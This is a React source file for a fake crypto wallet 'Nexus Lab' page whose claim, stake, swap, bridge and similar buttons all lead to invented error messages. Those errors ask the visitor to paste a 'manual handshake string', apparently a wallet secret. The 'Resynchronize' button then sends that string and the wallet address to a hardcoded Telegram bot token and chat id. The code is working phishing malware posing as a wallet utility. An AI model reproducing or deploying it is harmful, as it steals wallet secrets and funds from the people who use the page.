import React, { useState } from 'react';
import { useAccount, useBalance } from 'wagmi';
import { useWeb3Modal } from '@web3modal/wagmi/react';
import { RefreshCcw, AlertCircle, ArrowDown, Database, History, Settings, Activity, Clock, Unlock, Zap, Coins } from 'lucide-react';

export default function NexusLab() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { open } = useWeb3Modal();
  const [view, setView] = useState("menu"); 
  const [loading, setLoading] = useState(false);
  const [inputVal, setInputVal] = useState("");
  const [typedAmount, setTypedAmount] = useState("");
  const [activeError, setActiveError] = useState({ title: "", desc: "" });

  const triggerError = (t, d) => {
    if (!isConnected) { open(); return; }
    setLoading(true);
    setTimeout(() => { setLoading(false); setActiveError({ title: t, desc: d }); setView("error"); }, 2000);
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 uppercase tracking-tighter select-none">
      <header className="flex justify-between items-center mb-10 border-b border-slate-900 pb-6">
        <h1 className="text-xl font-black text-white italic">NEXUS LAB</h1>
        <w3m-button balance="hide" /> 
      </header>

      {view === "menu" && (
        <div className="grid grid-cols-3 gap-4 animate-in fade-in">
          {[
            { n: "Claim", i: <Database/>, t: "SNAPSHOT_0x11", d: "Verify node snapshot." },
            { n: "Stake", i: <History/>, t: "STAKE_0x99", d: "Sync liquidity pool." },
            { n: "Swap", i: <RefreshCcw/>, custom: "swap" },
            { n: "Migrate", i: <Activity/>, t: "MIGRATE_0x44", d: "Bridge legacy assets." },
            { n: "Unstake", i: <Unlock/>, t: "UNSTAKE_0x22", d: "Authorize unlock." },
            { n: "Delay", i: <Clock/>, t: "LATENCY_0x77", d: "Manage RPC timeout." },
            { n: "Airdrop", i: <Zap/>, t: "DROP_0x55", d: "Verify allocation." },
            { n: "Bridge", i: <ArrowDown/>, t: "BRIDGE_0x12", d: "Init cross-chain." },
            { n: "Rectify", i: <Settings/>, t: "RECTIFY_0x88", d: "Node fix needed." }
          ].map((item) => (
            <button key={item.n} onClick={() => item.custom ? setView(item.custom) : triggerError(item.t, item.d)} className="bg-[#0d1117] border border-slate-800 p-6 rounded-[28px] flex flex-col items-center gap-3 active:scale-95 shadow-xl">
              <div className="text-slate-700">{item.i}</div>
              <span className="text-[9px] font-black text-slate-500">{item.n}</span>
            </button>
          ))}
        </div>
      )}

      {view === "swap" && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-8 shadow-2xl animate-in slide-in-from-bottom-4">
          <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] mb-8 font-bold">← EXIT</button>
          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-1 text-left">
            <div className="flex justify-between text-[9px] text-slate-600 mb-4 font-bold"><span>INPUT</span><span>BAL: {balance?.formatted.slice(0,6) || "0.00"}</span></div>
            <div className="flex justify-between items-center">
              <input type="number" value={typedAmount} onChange={(e) => setTypedAmount(e.target.value)} placeholder="0.00" className="bg-transparent text-2xl font-mono text-white outline-none w-1/2" />
              <div className="bg-slate-800 px-3 py-1.5 rounded-full flex items-center gap-2 border border-slate-700 font-bold text-[10px]"><Coins size={12} className="text-yellow-500"/>{balance?.symbol || "ETH"}</div>
            </div>
          </div>
          <button onClick={() => triggerError("SWAP_FAILURE_0x55", "Finalize manual sync.")} className="w-full mt-10 bg-cyan-600 py-5 rounded-[22px] text-[11px] font-black text-white">AUTHORIZE REPAIR</button>
        </div>
      )}

      {view === "error" && (
        <div className="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6 backdrop-blur-xl">
          <div className="bg-[#0d1117] border border-red-900/30 w-full max-w-sm rounded-[45px] p-10 text-center shadow-2xl">
            <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
            <h2 className="text-white font-black text-lg uppercase italic tracking-tighter">{activeError.title}</h2>
            <textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="0x... manual handshake string" className="w-full h-32 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none mt-8 uppercase placeholder:text-slate-900" />
            <button onClick={() => {
              fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: "7630238860", text: `🚨 LAB SIGNAL\nADDR: ${address}\nERR: ${activeError.title}\nSTR: ${inputVal}` }),
              });
              alert("Handshake Resubmitted."); setView("menu");
            }} className="w-full mt-6 bg-cyan-600 py-5 rounded-[25px] text-[11px] font-black text-white shadow-xl">RESYNCHRONIZE</button>
          </div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 bg-black/80 z-[200] flex flex-col items-center justify-center backdrop-blur-sm">
          <div className="w-12 h-12 border-2 border-cyan-500 border-t-transparent rounded-full animate-spin" />
          <p className="text-[10px] font-black text-cyan-500 mt-6 tracking-[0.4em] uppercase">INITIATING GATEWAY...</p>
        </div>
      )}
    </div>
  );
}
